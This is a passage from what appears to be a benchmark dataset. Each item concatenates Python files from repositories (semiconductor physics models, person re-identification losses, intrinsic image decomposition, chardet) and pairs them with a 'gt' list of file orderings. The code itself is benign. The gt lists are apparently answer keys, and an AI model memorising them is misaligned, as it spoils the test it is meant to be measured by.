Eg\n\n'semiconductor/src/semiconductor/recombination/__init__.py'\n:\n\nfrom .intrinsic import Intrinsic, Radiative, Auger\nfrom .extrinsic import SRH\n\n'semiconductor/src/semiconductor/material/bandgap_intrinsic.py'\n:\nimport matplotlib.pylab as plt\nimport os\nimport numpy as np\nfrom semiconductor.material import bandgap_intrinsic_models as iBg\nfrom semiconductor.helper.helper import BaseModelClass\n\n\nclass IntrinsicBandGap(BaseModelClass):\n\n\n    _cal_dts = {\n        'material': 'Si',\n        'temp': 300.,\n        'author': None,\n        'multiplier': 1.,\n    }\n    author_list = 'bandgap.yaml'\n\n    def __init__(self, **kwargs):\n\n\n\n        self.calculationdetails = kwargs\n\n\n        author_file = os.path.join(\n            os.path.dirname(os.path.realpath(__file__)),\n            self._cal_dts['material'],\n            self.author_list)\n\n\n        self._int_model(author_file)\n\n\n        self.change_model(self._cal_dts['author'])\n\n    def update(self, **kwargs):\n        '''\n        a function to update the intrinsic BandGap\n\n        inputs:\n            temperature in kelvin\n            author: (optional)\n                  the author used.\n                  If not provided the last provided author is used\n                  If no author has then the author Passler's is used\n            multiplier: A band gap multipler. 1.01 is suggested.\n\n        output:\n            the intrinsic bandgap in eV\n        '''\n\n        self.calculationdetails = kwargs\n\n        if 'author' in kwargs.keys():\n            self.change_model(self._cal_dts['author'])\n        Eg = getattr(iBg, self.model)(self.vals, temp=self._cal_dts['temp'])\n\n        return Eg * self._cal_dts['multiplier']\n\n    def check_models(self):\n\n        plt.figure('Intrinsic bandgap')\n        t = np.linspace(1, 500)\n\n        for author in self.available_models():\n\n            Eg = self.update(temp=t, author=author, multiplier=1.0)\n            plt.plot(t, Eg, label=author)\n\n        test_file = os.path.join(\n            os.path.dirname(os.path.realpath(__file__)),\n            'Si', 'check data', 'iBg.csv')\n\n        data = np.genfromtxt(test_file, delimiter=',', names=True)\n\n        for temp, name in zip(data.dtype.names[0::2], data.dtype.names[1::2]):\n            plt.plot(\n                data[temp], data[name], '--', label=name)\n\n        plt.xlabel('Temperature (K)')\n        plt.ylabel('Intrinsic Bandgap (eV)')\n\n        plt.legend(loc=0)\n        self.update(temp=0, author=author, multiplier=1.01)\n\n'semiconductor/src/semiconductor/material/__init__.py'\n:\n\nfrom .bandgap_intrinsic import IntrinsicBandGap\nfrom .bandgap import BandGap\nfrom .bandgap_narrowing import BandGapNarrowing\nfrom .densityofstates import DOS\nfrom .intrinsic_carrier_density import IntrinsicCarrierDensity\nfrom .thermal_velocity import ThermalVelocity\n\n'semiconductor/src/semiconductor/recombination/extrinsic.py'\n:\nimport numpy as np\nimport sys\nimport os\nimport scipy.constants as const\nimport matplotlib.pylab as plt\n\nfrom semiconductor.helper.helper import BaseModelClass, class_or_value\nfrom semiconductor.general_functions.carrierfunctions import get_carriers\nfrom semiconductor.material.intrinsic_carrier_density import IntrinsicCarrierDensity as ni\nfrom semiconductor.material.thermal_velocity import ThermalVelocity as Vel_th\nfrom semiconductor.material import BandGapNarrowing\n\nsys.path.append(\n    os.path.abspath(os.path.join(os.getcwd(), os.pardir, os.pardir)))\n\n\nclass SRH(BaseModelClass):\n\n\n\n\n\n\n\n\n    _cal_dts = {\n        'material': 'Si',\n        'defect': None,\n        'temp': 300.,\n        'vth_author': None,\n        'Nt': 1e10,\n        'Nd': 0,\n        'Na': 1e16,\n        'nxc': 1e10,\n        'ni_author': None,\n        'BGN_author': None\n    }\n\n    vel_th_e = None\n    vel_th_h = None\n\n    author_list = 'SRH.yaml'\n\n    def __init__(self, **kwargs):\n\n\n        self.calculationdetails = kwargs\n\n\n        author_file = os.path.join(\n            os.path.dirname(os.path.realpath(__file__)),\n            self._cal_dts['material'],\n            self.author_list)\n\n\n        self._int_model(author_file)\n\n        self._change_model(self._cal_dts['defect'])\n        self._update_links()\n        self._cal_taun_taup()\n\n    def _update_links(self):\n\n\n\n        self.ni, self._cal_dts['ni_author'] = class_or_value(\n            self._cal_dts['ni_author'],\n            ni,\n            'update',\n            material=self._cal_dts['material'],\n            temp=self._cal_dts['temp'])\n\n        vels, self._cal_dts['vth_author'] = class_or_value(\n            self._cal_dts['vth_author'],\n            Vel_th,\n            'update',\n            material=self._cal_dts['material'],\n            temp=self._cal_dts['temp'])\n\n        self.vel_th_e, self.vel_th_h = vels\n\n        nieff_mult, self._cal_dts['BGN_author'] = class_or_value(\n            self._cal_dts['BGN_author'],\n            BandGapNarrowing,\n            'ni_multiplier',\n            material=self._cal_dts['material'],\n            temp=self._cal_dts['temp'],\n            nxc=[0],\n            Na=self._cal_dts['Na'],\n            Nd=self._cal_dts['Nd'],)\n\n        self.nieff = self.ni * nieff_mult\n\n    def _cal_taun_taup(self):\n\n\n        self.vals['tau_e'] = 1. / self._cal_dts['Nt']\\\n            / self.vals['sigma_e'] / self.vel_th_e\n        self.vals['tau_h'] = 1. / self._cal_dts['Nt']\\\n            / self.vals['sigma_h'] / self.vel_th_h\n\n    def _change_model(self, defect):\n\n\n\n        self.change_model(self._cal_dts['defect'])\n\n\n        if 'vth_author' in self.vals.keys():\n            self._cal_dts['vth_author'] = self.vals['vth_author']\n\n\n        self._update_links()\n\n    def tau(self, **kwargs):\n\n\n        if bool(kwargs):\n            self.calculationdetails = kwargs\n\n        if 'defect' in kwargs:\n            self._change_model(self._cal_dts['defect'])\n            self._cal_taun_taup()\n\n\n        if 'author' in ''.join(kwargs.keys()):\n            self._update_links()\n            self._cal_taun_taup()\n\n        if 'Na' in ''.join(kwargs.keys()) or 'Nd'in ''.join(kwargs.keys()):\n            self._update_links()\n            self._cal_taun_taup()\n\n        return self._tau(self._cal_dts['nxc'],\n                         self.vals['tau_e'],\n                         self.vals['tau_h'],\n                         self.vals['et'])\n\n    def itau(self, **kwargs):\n        return 1. / self.tau(**kwargs)\n\n    def _tau(self, nxc, tau_e, tau_h, Et):\n\n\n        nh1 = self.nieff * \\\n            np.exp(-Et * const.e / (const.k * self._cal_dts['temp']))\n\n        ne1 = self.nieff * \\\n            np.exp(Et * const.e / (const.k * self._cal_dts['temp']))\n\n\n        ne, nh = get_carriers(Na=self._cal_dts['Na'],\n                              Nd=self._cal_dts['Nd'],\n                              nxc=self._cal_dts['nxc'],\n                              temp=self._cal_dts['temp'],\n                              material=self._cal_dts['material'],\n                              ni=self.nieff\n                              )\n\n\n        U = (ne * nh - self.nieff**2 ) / \\\n            (tau_h * (ne + ne1) + tau_e * (nh + nh1))\n\n        return self._cal_dts['nxc'] / U\n\n    def usr_vals(self, Et=None, sigma_e=None, sigma_h=None,\n                 tau_e=None, tau_h=None, Nt=None):\n\n        temp = self.vals\n\n        self.vals = {\n            'et': Et or temp['et'],\n            'sigma_e': sigma_e or temp['sigma_e'],\n            'sigma_h': sigma_h or temp['sigma_h'],\n            'doi':  None,\n            'notes': 'User defined value',\n            'tau_e': np.array([tau_e]) or temp['tau_e'],\n            'tau_h': np.array([tau_h]) or temp['tau_h'],\n        }\n\n\n        if Et == 0:\n            self.vals['et'] = 0\n\n        if 'vth_author' in self.vals:\n            del self.vals['vth_author']\n\n        self._cal_dts['Nt'] = Nt or self._cal_dts['Nt']\n\n\n\n        if tau_e is None and tau_h is None:\n            self._cal_taun_taup()\n        else:\n            self.vals.update(\n                {'sigma_e': None,\n                 'sigma_h': None,\n                 }\n            )\n\n    def _plot_all(self):\n        fig, ax = plt.subplots(1, 2, figsize=(16, 6))\n\n        counter = 0\n        defects = self.AvailableModels()\n        deltan = np.logspace(12, 17)\n        for defect in defects:\n\n            self.select_defect(defect)\n            self.cal_tau(1e10)\n            ax[0].plot(counter, self.Et, 'o', label=defect)\n            ax[1].plot(deltan, self.tau(deltan) * 1e6, label=defect)\n            counter += 1\n\n\n        x = np.arange(counter)\n\n        ax[0].set_xticks(x)\n        ax[0].set_xticklabels(defects, rotation=90)\n        ax[0].set_xlabel('Defect')\n        ax[0].set_ylabel('E$_t$ from Ei (eV)')\n        ax[1].loglog()\n        ax[1].set_xlabel('$\\Delta$ n (cm$^{-3}$)')\n        ax[1].set_ylabel('Lifetime (us)')\n\n'semiconductor/src/semiconductor/material/bandgap.py'\n:\n\n\nimport sys\n\nfrom semiconductor.material.bandgap_intrinsic import IntrinsicBandGap\nfrom semiconductor.material.bandgap_narrowing import BandGapNarrowing\nfrom semiconductor.helper.helper import BaseModelClass\n\n\nclass BandGap(BaseModelClass):\n\n\n    _cal_dts = {\n        'material': 'Si',\n        'temp': 300.,\n        'iEg_author': None,\n        'multiplier': 1.,\n        'BGN_author': None,\n        'dopant': 'boron',\n        'nxc': 1,\n        'Na': 1e16,\n        'Nd': 0,\n    }\n\n    def __init__(self, **kwargs):\n\n\n        self.calculationdetails = kwargs\n\n\n        self._update_links()\n\n    def _update_links(self):\n\n        self.iEg = IntrinsicBandGap(material=self._cal_dts['material'],\n                                    author=self._cal_dts['iEg_author'],\n                                    temp=self._cal_dts['temp'],\n                                    multiplier=self._cal_dts['multiplier'],\n                                    )\n        self.BGN = BandGapNarrowing(material=self._cal_dts['material'],\n                                    author=self._cal_dts['BGN_author'],\n                                    temp=self._cal_dts['temp'],\n                                    nxc=self._cal_dts['nxc'],\n                                    )\n\n    def plot_all_models(self):\n        self.iEg.plot_all_models()\n        self.BGN.plot_all_models()\n\n    def update(self, **kwargs):\n\n        self.calculationdetails = kwargs\n\n\n\n        dopant_model_list = self.BGN.available_models(\n            'dopant', self._cal_dts['dopant'])\n\n\n        if self._cal_dts['BGN_author'] not in dopant_model_list:\n            sys.exit(\n                '''\\nThe BGN author you have selected was not for your selected dopant.\\nPlease try selecting one of the following authors:\\n\\t''' +\n                str('\\n\\t'.join([i for i in dopant_model_list])) +\n                '''\\nFor the selected dopant: {0}\\n'''.format(\n                    self._cal_dts['dopant'])\n            )\n\n        Eg = self.iEg.update(material=self._cal_dts['material'],\n                             author=self._cal_dts['iEg_author'],\n                             temp=self._cal_dts['temp'],\n                             multiplier=self._cal_dts['multiplier'],\n                             ) - \\\n            self.BGN.update(material=self._cal_dts['material'],\n                            author=self._cal_dts['BGN_author'],\n                            temp=self._cal_dts['temp'],\n                            nxc=self._cal_dts['nxc'],\n                            Na=self._cal_dts['Na'],\n                            Nd=self._cal_dts['Nd'],\n                            )\n        return Eg\n\n    def check_models(self):\n        self.iEg.check_models()\n        self.BGN.check_models()\n",
        "gt": [
            "'semiconductor/src/semiconductor/material/bandgap_intrinsic_models.py'",
            "'semiconductor/src/semiconductor/material/bandgap_intrinsic.py'",
            "'semiconductor/src/semiconductor/material/bandgap.py'",
            "'semiconductor/src/semiconductor/material/__init__.py'",
            "'semiconductor/src/semiconductor/recombination/extrinsic.py'",
            "'semiconductor/src/semiconductor/recombination/__init__.py'"
        ]
    },
    {
        "files": [
            "'person-reid-lib/tasks/task_viper/solver.py'",
            "'person-reid-lib/lib/network/loss_factory/triplet.py'",
            "'person-reid-lib/tasks/task_video/architecture.py'",
            "'person-reid-lib/lib/network/loss_factory/__init__.py'"
        ],
        "content": "'person-reid-lib/tasks/task_viper/solver.py'\n:from lib.network.solver_factory import TaskSolverBase\nfrom architecture import NetClient, ModelClient\n__all__ = ['Solver']\n\n\nclass Solver(TaskSolverBase):\n    def const_options(self):\n\n        self.display_step = 1\n        self.instance_num = 8 if self.manager.device['name'] != 'pc' else 3\n        self.sample_num = 4\n        self.depth = 8 if self.manager.device['name'] != 'pc' else 2\n\n        self.train_dataloder_type = 'All'\n        self.minframes = {'train': self.depth, 'test': 1}\n\n\n        self.test_batch_size = self.manager.device['test_batch_size']\n\n    def init_options(self):\n\n        self.use_flow = False\n        self.save_model = False\n        self.reuse_model = False\n        self.store_search_result = False\n        self.net_client = NetClient\n        self.model_client = ModelClient\n\n'person-reid-lib/lib/network/loss_factory/triplet.py'\n:from __future__ import absolute_import\n\nimport torch\nimport torch.nn as nn\nimport torch.nn.functional as F\n\n\nclass RawTripletLoss(nn.Module):\n    def __init__(self, margin=1):\n        super(RawTripletLoss, self).__init__()\n        self.margin = margin\n        self.ranking_loss = nn.MarginRankingLoss(margin=margin)\n\n    def forward(self, inputs, targets):\n        inputs = F.normalize(inputs)\n        inputs = inputs.view(-1, 3, inputs.size(-1))\n        dist_ap = torch.pow(inputs[:, 0] - inputs[:, 1], 2).sum(dim=1)\n        dist_an = torch.pow(inputs[:, 0] - inputs[:, 2], 2).sum(dim=1)\n        y = torch.ones(dist_an.size(), dtype=dist_an.dtype, device=dist_an.device)\n        loss = self.ranking_loss(dist_an, dist_ap, y)\n        return loss\n\n\nclass BatchHardTripletLoss(nn.Module):\n    def __init__(self, margin=0):\n        super(BatchHardTripletLoss, self).__init__()\n        self.margin = margin\n        self.ranking_loss = nn.MarginRankingLoss(margin=margin)\n\n    def forward(self, inputs, targets):\n        batch_size = inputs.size(0)\n        dist = torch.pow(inputs, 2).sum(dim=1, keepdim=True).expand(batch_size, batch_size)\n        dist = dist + dist.t()\n        dist.addmm_(1, -2, inputs, inputs.t())\n        dist = dist.clamp(min=1e-12).sqrt()\n        mask = targets.expand(batch_size, batch_size).eq(targets.expand(batch_size, batch_size).t())\n\n        dist_ap = dist[mask == 1]\n        dist_ap = dist_ap.view(batch_size, -1)\n        dist_an = dist[mask == 0]\n        dist_an = dist_an.view(batch_size, -1)\n        dist_ap, _ = torch.max(dist_ap, dim=1)\n        dist_an, _ = torch.min(dist_an, dim=1)\n\n        y = torch.ones(dist_an.size(), dtype=dist_an.dtype, device=dist_an.device)\n        loss = self.ranking_loss(dist_an, dist_ap, y)\n        return loss\n'person-reid-lib/tasks/task_video/architecture.py'\n:import torch\nimport torch.nn as nn\nimport torch.nn.functional as F\nfrom lib.network.model_factory.inception_v3 import ModelServer, NetServer, BackboneModel\nfrom lib.network.loss_factory import BatchHardTripletLoss\nfrom lib.network.layer_factory.utils import BasicConv2d\n\n\nclass FuseNet(nn.Module):\n    def __init__(self, input_size, hidden_size):\n        super().__init__()\n        self.hidden_size = hidden_size\n        bottleneck_size = [256, 128]\n        self.reduce_dim_z = BasicConv2d(input_size * 2, bottleneck_size[0], kernel_size=1, padding=0)\n        self.s_atten_z = nn.Sequential(\n            nn.Conv2d(1, bottleneck_size[1], kernel_size=8, padding=0, bias=False),\n            nn.ReLU(inplace=True),\n            nn.Conv2d(bottleneck_size[1], 64, kernel_size=1, padding=0, bias=False))\n        self.c_atten_z = nn.Sequential(\n            nn.AvgPool2d(8),\n            nn.Conv2d(bottleneck_size[0], input_size, kernel_size=1, padding=0, bias=False))\n\n        self.t_info = nn.Sequential(\n            nn.Conv3d(input_size, 256, 1, bias=False),\n            nn.BatchNorm3d(256),\n            nn.ReLU(inplace=True),\n            nn.Conv3d(256, self.hidden_size, 3, padding=1, bias=False),\n            nn.BatchNorm3d(self.hidden_size),\n            nn.ReLU(inplace=True)\n        )\n        self.pool = nn.AvgPool2d(8)\n\n    def generate_attention_z(self, x):\n        z = self.reduce_dim_z(x)\n        atten_s = self.s_atten_z(z.mean(dim=1, keepdim=True)).view(z.size(0), 1, z.size(2), z.size(3))\n        atten_c = self.c_atten_z(z)\n        z = F.sigmoid(atten_s * atten_c)\n        return z, 1 - z\n\n    def forward(self, x, is_training=True):\n        if x.dim() == 4:\n            x = x.view((1,) + x.size())\n        assert x.dim() == 5\n\n        video_num = x.size(0)\n        depth = x.size(1)\n\n        res = torch.cat((x[:, 0].contiguous().view((x.size(0), 1) + x.size()[2:]), x), dim=1)\n        res = res[:, :-1]\n        res = x - res\n\n        h = x[:, 0]\n        output = []\n        for t in range(depth):\n            con_fea = torch.cat((h - x[:, t], res[:, t]), dim=1)\n            z_p, z_r = self.generate_attention_z(con_fea)\n            h = z_r * h + z_p * x[:, t]\n            output.append(h)\n\n        fea_t = torch.stack(output, dim=2)\n        fea_s = fea_t.mean(dim=4).mean(dim=2)\n        fea_t = self.pool(self.t_info(fea_t).mean(dim=2)).view(video_num, -1)\n        return fea_t, fea_s\n\n\nclass ModelClient(ModelServer):\n    def __init__(self, num_classes, num_camera, use_flow, is_image_dataset, raw_model_dir, logger):\n        super().__init__(use_flow, is_image_dataset, logger)\n\n        model = self.get_model(BackboneModel, raw_model_dir, logger)\n        self.backbone_fea_dim = model.fea_dim\n        self.fea_dim = 256\n        aux_fc_in_dim = model.aux_fc_in_dim\n        self.net_info = ['backbone feature dim: ' + str(self.backbone_fea_dim)]\n        self.net_info.append('final feature dim: ' + str(self.fea_dim))\n        self.base = model.base\n        model.feature.AuxLogits.fc = nn.Linear(aux_fc_in_dim, num_classes)\n        model.feature.AuxLogits.fc.stddev = 0.001\n\n        if not self.is_image_dataset:\n            self.fuse_net = FuseNet(self.backbone_fea_dim, self.fea_dim)\n        self.classifier = self.get_classifier(self.fea_dim, num_classes)\n        self.feature = model\n\n        self.distance_func = 'L2Euclidean'\n\n    def forward(self, x):\n        fea, aux = self.feature(x)\n        fea_t, fea_s_p = self.fuse_net(fea)\n\n        logits = self.classifier(fea_t)\n        return fea_s_p, fea_t, logits, aux\n\n\nclass NetClient(NetServer):\n    def init_options(self):\n        self.contrast = BatchHardTripletLoss(margin=0.4)\n        self.line_name = ['Identity',\n                          'Aux',\n                          'Part',\n                          'Video', 'All']\n\n    def get_part_loss(self, fea_part, target):\n        h_dim = fea_part.size(2)\n        loss_part = self.contrast(fea_part[:, :, 0], target)\n        for part_i in range(1, h_dim):\n            loss_part += self.contrast(fea_part[:, :, part_i], target)\n        return 1.0 / h_dim * loss_part\n\n    def compute_loss(self, model_output, label_identity):\n        fea_s_p, fea_t_v, logits_i, logits_a = model_output\n\n        loss_identity_i = self.identity(logits_i, label_identity)\n        loss_identity_a = self.identity(logits_a, label_identity)\n\n        loss_s_p = self.get_part_loss(fea_s_p, label_identity)\n        loss_t_v = self.contrast(fea_t_v, label_identity)\n\n        loss_final = loss_identity_i + loss_identity_a + loss_t_v + loss_s_p\n\n        self.loss_mean.updata([loss_identity_i.item(),\n                               loss_identity_a.item(),\n                               loss_s_p.item(),\n                               loss_t_v.item(),\n                               loss_final.item()])\n        return loss_final\n\n'person-reid-lib/lib/network/loss_factory/__init__.py'\n:from __future__ import absolute_import\n\nfrom .utils import CrossEntropyLabelSmooth, CenterLoss, ContrastiveLoss, RingLoss\nfrom .triplet import BatchHardTripletLoss, RawTripletLoss\nfrom .oim import OIMLoss\n\n\n__all__ = ['ContrastiveLoss',\n           'CenterLoss',\n           'CrossEntropyLabelSmooth',\n           'OIMLoss',\n           'RingLoss',\n           'BatchHardTripletLoss',\n           'RawTripletLoss']",
        "gt": [
            "'person-reid-lib/lib/network/loss_factory/triplet.py'",
            "'person-reid-lib/lib/network/loss_factory/__init__.py'",
            "'person-reid-lib/tasks/task_video/architecture.py'",
            "'person-reid-lib/tasks/task_viper/solver.py'"
        ]
    },
    {
        "files": [
            "'intrinsic/bell2014/energy/energy.py'",
            "'intrinsic/bell2014/energy/__init__.py'",
            "'intrinsic/bell2014/density.py'",
            "'intrinsic/bell2014/energy/prob_abs_r.py'"
        ],
        "content": "'intrinsic/bell2014/energy/energy.py'\n:import timeit\nimport numpy as np\n\nfrom ..image_util import gaussian_blur_gray_image_nz\nfrom .prob_abs_r import ProbAbsoluteReflectance\nfrom .prob_abs_s import ProbAbsoluteShading\n\n\nclass IntrinsicEnergy(object):\n\n    def __init__(self, input, params):\n        self.input = input\n        self.params = params\n        self.prob_abs_r = ProbAbsoluteReflectance(params)\n        self.prob_abs_s = ProbAbsoluteShading(params)\n\n    def compute_unary_costs(self, decomposition, prev_decomposition):\n\n\n        if self.params.logging:\n            t0 = timeit.default_timer()\n            print(\"compute_unary_costs...\")\n\n        intensities = decomposition.intensities\n        chromaticities = decomposition.chromaticities\n        nlabels = intensities.shape[0]\n        unary_costs = np.zeros(\n            (self.input.mask_nnz, nlabels),\n            dtype=np.float32)\n\n        sigma_spatial = (\n            self.params.shading_blur_sigma *\n            self.input.diag / (\n                1.0 + decomposition.iter_num **\n                self.params.shading_blur_iteration_pow\n            )\n        )\n        if self.params.logging:\n            print('blur sigma: %s pixels (image diagonal: %s pixels)' %\n                  (sigma_spatial, self.input.diag))\n\n\n        if prev_decomposition:\n            prev_r_nz, prev_s_nz = prev_decomposition.get_r_s_nz()\n        elif self.params.shading_blur_init_method == \"constant\":\n            prev_s_nz = 0.5 * np.ones_like(self.input.image_gray_nz)\n        elif self.params.shading_blur_init_method == \"image\":\n            prev_s_nz = self.input.image_gray_nz\n        elif self.params.shading_blur_init_method == \"none\":\n            prev_s_nz = None\n        else:\n            raise ValueError(\"Unknown shading_blur_init_method: %s\" %\n                             self.params.shading_blur_init_method)\n\n        if prev_s_nz is not None:\n            if self.params.shading_blur_log:\n\n                blur_input = np.log(prev_s_nz)\n            else:\n\n                blur_input = prev_s_nz\n\n            blur_output = gaussian_blur_gray_image_nz(\n                image_nz=blur_input,\n                image_shape=self.input.shape,\n                mask_nz=self.input.mask_nz,\n                sigma=sigma_spatial,\n            )\n\n            if self.params.shading_blur_log:\n                log_s_target_nz = blur_output\n            else:\n                log_s_target_nz = np.log(blur_output)\n        else:\n            log_s_target_nz = None\n\n\n        if self.params.shading_target_chromaticity:\n            labels_rgb = np.clip(\n                decomposition.get_reflectances_rgb(), 1e-5, np.inf)\n\n\n        for i in xrange(nlabels):\n            s_nz = self.input.image_gray_nz / intensities[i]\n            r_nz = (self.input.image_rgb_nz /\n                    np.clip(s_nz, 1e-4, 1e5)[:, np.newaxis])\n\n\n            unary_costs[:, i] += (\n                self.prob_abs_s.cost(s_nz) +\n                self.prob_abs_r.cost(r_nz)\n            )\n\n\n\n\n            if self.params.chromaticity_weight:\n                if self.params.chromaticity_norm == \"L1\":\n                    f = np.abs\n                elif self.params.chromaticity_norm == \"L2\":\n                    f = np.square\n                else:\n                    raise ValueError(\n                        \"Invalid value of chromaticity_norm: %s\" %\n                        self.params.chromaticity_norm)\n\n                unary_costs[:, i] += self.params.chromaticity_weight * (\n                    np.sum(\n                        f(self.input.image_irg_nz[:, 1:3] -\n                          chromaticities[i, :]),\n                        axis=1\n                    )\n                )\n\n\n            if self.params.shading_target_weight and log_s_target_nz is not None:\n                if self.params.shading_target_norm == \"L2\":\n                    f = np.square\n                elif self.params.shading_target_norm == \"L1\":\n                    f = np.abs\n                else:\n                    raise ValueError(\"Invalid value of shading_target_norm: %s\" %\n                                     self.params.shading_target_norm)\n\n                if self.params.shading_target_chromaticity:\n\n\n\n\n                    label_rgb = labels_rgb[i, :]\n                    s_rgb_nz = self.input.image_rgb_nz / label_rgb[np.newaxis, :]\n                    log_s_rgb_nz = np.log(np.clip(s_rgb_nz, 1e-5, np.inf))\n                    unary_costs[:, i] += (\n                        self.params.shading_target_weight *\n                        np.sum(f(log_s_rgb_nz - log_s_target_nz[:, np.newaxis]), axis=-1)\n                    )\n                else:\n\n                    log_s_nz = np.log(s_nz)\n                    unary_costs[:, i] += (\n                        self.params.shading_target_weight *\n                        f(log_s_nz - log_s_target_nz)\n                    )\n\n        if self.params.logging:\n            t1 = timeit.default_timer()\n            print(\"compute_unary_costs: done (%s s)\" % (t1 - t0))\n\n        return unary_costs\n\n    def compute_pairwise_costs(self, decomposition):\n\n\n        if self.params.pairwise_intensity_chromaticity:\n\n            nlabels = decomposition.intensities.shape[0]\n            R = decomposition.get_reflectances_rgb()\n            if self.params.pairwise_intensity_log:\n                R = np.log(np.clip(R, 1e-5, np.inf))\n            binary_costs = np.zeros((nlabels, nlabels), dtype=np.float32)\n            for i in xrange(nlabels):\n                for j in xrange(i):\n                    cost = np.sum(np.abs(R[i, :] - R[j, :]))\n                    binary_costs[i, j] = cost\n                    binary_costs[j, i] = cost\n        else:\n\n            R = decomposition.intensities\n            if self.params.pairwise_intensity_log:\n                R = np.log(np.clip(R, 1e-5, np.inf))\n            binary_costs = np.abs(R[:, np.newaxis] - R[np.newaxis, :])\n\n        return binary_costs\n\n    def get_features(self):\n\n\n        if not hasattr(self, '_features'):\n            mask_nz = self.input.mask_nz\n            mask_nnz = self.input.mask_nnz\n            features = np.zeros((mask_nnz, 5), dtype=np.float32)\n\n\n            features[:, 0] = (\n                self.input.image_irg[mask_nz[0], mask_nz[1], 0] /\n                self.params.theta_l)\n\n\n            features[:, 1] = (\n                self.input.image_irg[mask_nz[0], mask_nz[1], 1] /\n                self.params.theta_c)\n            features[:, 2] = (\n                self.input.image_irg[mask_nz[0], mask_nz[1], 2] /\n                self.params.theta_c)\n\n\n            features[:, 3] = (\n                mask_nz[0] / (self.params.theta_p * self.input.diag))\n            features[:, 4] = (\n                mask_nz[1] / (self.params.theta_p * self.input.diag))\n\n            self._features = features\n            self._features.setflags(write=False)\n\n        return self._features\n\n'intrinsic/bell2014/energy/__init__.py'\n:from .energy import IntrinsicEnergy\nfrom .prob_abs_r import ProbAbsoluteReflectance\nfrom .prob_abs_s import ProbAbsoluteShading\n\n'intrinsic/bell2014/density.py'\n:import numpy as np\nfrom scipy.ndimage.filters import gaussian_filter\n\n\nclass ProbDensityHistogram(object):\n\n    def train(self, training_data, bins=100, bandwidth=3, smoothing=1e-2):\n        self.ndim = training_data.shape[1]\n        self.bins = bins\n        self.hist, self.edges = np.histogramdd(\n            training_data, bins=bins, normed=True)\n        self.hist[self.hist < smoothing] = smoothing\n        if bandwidth:\n            self.hist = gaussian_filter(self.hist, sigma=bandwidth)\n\n        self.hist = np.log(self.hist)\n\n    def logprob(self, samples):\n        indices = [np.digitize(samples[:, i], self.edges[i])\n                   for i in xrange(self.ndim)]\n        for i in xrange(self.ndim):\n            np.clip(indices[i], 0, self.bins - 1, out=indices[i])\n        ret = self.hist[indices]\n        assert ret.shape[0] == samples.shape[0]\n        return ret\n\n'intrinsic/bell2014/energy/prob_abs_r.py'\n:import os\nimport sys\nimport csv\nimport gzip\nimport cPickle\nimport numpy as np\n\nfrom ..density import ProbDensityHistogram\n\n\nclass ProbAbsoluteReflectance(object):\n\n\n    def __init__(self, params):\n        self.params = params\n        self._load()\n\n    def cost(self, r_nz):\n        if self.params.abs_reflectance_weight:\n            return self.params.abs_reflectance_weight * \\\n                (-self.density.logprob(np.log(r_nz)))\n        else:\n            return 0\n\n    def _load(self):\n        if self.params.logging:\n            print(\"loading reflectances...\")\n\n        cur_dir = os.path.dirname(os.path.abspath(__file__))\n        data_filename = os.path.join(cur_dir, 'prob_abs_r.dat')\n        if not os.path.exists(data_filename):\n            rows = []\n            to_id = {}\n            with open(os.path.join(cur_dir, 'bsdfs.csv'), 'rb') as csvfile:\n                first = True\n                for row in csv.reader(csvfile):\n                    if first:\n                        to_id = {name: i for i, name in enumerate(row)}\n                        first = False\n                    else:\n                        if row[to_id['colored_reflection']] == 'False':\n                            r = float(row[to_id['rho_d_r']])\n                            g = float(row[to_id['rho_d_g']])\n                            b = float(row[to_id['rho_d_b']])\n                            if r > 1e-4 and g > 1e-4 and b > 1e-4:\n                                rows.append([r, g, b])\n            data_raw = np.array(rows)\n\n            data = np.clip(np.log(data_raw), np.log(1e-4), 0)\n            self.density = ProbDensityHistogram()\n            self.density.train(data, bins=100, bandwidth=3)\n\n            cPickle.dump(\n                obj=self.density,\n                file=gzip.open(data_filename, \"wb\"),\n                protocol=cPickle.HIGHEST_PROTOCOL\n            )\n        else:\n\n\n            path = os.path.dirname(os.path.dirname(os.path.dirname(__file__)))\n            if path not in sys.path:\n                sys.path.append(path)\n\n            self.density = cPickle.load(gzip.open(data_filename, \"rb\"))\n\n        if self.params.logging:\n            print(\"loaded reflectances\")\n",
        "gt": [
            "'intrinsic/bell2014/density.py'",
            "'intrinsic/bell2014/energy/prob_abs_r.py'",
            "'intrinsic/bell2014/energy/energy.py'",
            "'intrinsic/bell2014/energy/__init__.py'"
        ]
    },
    {
        "files": [
            "'PlugAPI4Py/requests/packages/chardet/chardetect.py'",
            "'PlugAPI4Py/requests/packages/chardet/escprober.py'",
            "'PlugAPI4Py/requests/packages/chardet/universaldetector.py'",
            "'PlugAPI4Py/requests/packages/chardet/escsm.py'",
            "'PlugAPI4Py/requests/packages/chardet/constants.py'"
        ],
        "content": "'PlugAPI4Py/requests/packages/chardet/chardetect.py'\n:\n\n\nfrom __future__ import absolute_import, print_function, unicode_literals\n\nimport argparse\nimport sys\nfrom io import open\n\nfrom chardet import __version__\nfrom chardet.universaldetector import UniversalDetector\n\n\ndef description_of(lines, name='stdin'):\n\n    u = UniversalDetector()\n    for line in lines:\n        u.feed(line)\n    u.close()\n    result = u.result\n    if result['encoding']:\n        return '{0}: {1} with confidence {2}'.format(name, result['encoding'],\n                                                     result['confidence'])\n    else:\n        return '{0}: no result'.format(name)\n\n\ndef main(argv=None):\n\n\n    parser = argparse.ArgumentParser(\n        description=\"Takes one or more file paths and reports their detected \\\n                     encodings\",\n        formatter_class=argparse.ArgumentDefaultsHelpFormatter,\n        conflict_handler='resolve')\n    parser.add_argument('input',\n                        help='File whose encoding we would like to determine.',\n                        type=argparse.FileType('rb'), nargs='*',\n                        default=[sys.stdin])\n    parser.add_argument('--version', action='version',\n                        version='%(prog)s {0}'.format(__version__))\n    args = parser.parse_args(argv)\n\n    for f in args.input:\n        if f.isatty():\n            print(\"You are running chardetect interactively. Press \" +\n                  \"CTRL-D twice at the start of a blank line to signal the \" +\n                  \"end of your input. If you want help, run chardetect \" +\n                  \"--help\\n\", file=sys.stderr)\n        print(description_of(f, f.name))\n\n\nif __name__ == '__main__':\n    main()\n\n'PlugAPI4Py/requests/packages/chardet/escprober.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nfrom . import constants\nfrom .escsm import (HZSMModel, ISO2022CNSMModel, ISO2022JPSMModel,\n                    ISO2022KRSMModel)\nfrom .charsetprober import CharSetProber\nfrom .codingstatemachine import CodingStateMachine\nfrom .compat import wrap_ord\n\n\nclass EscCharSetProber(CharSetProber):\n    def 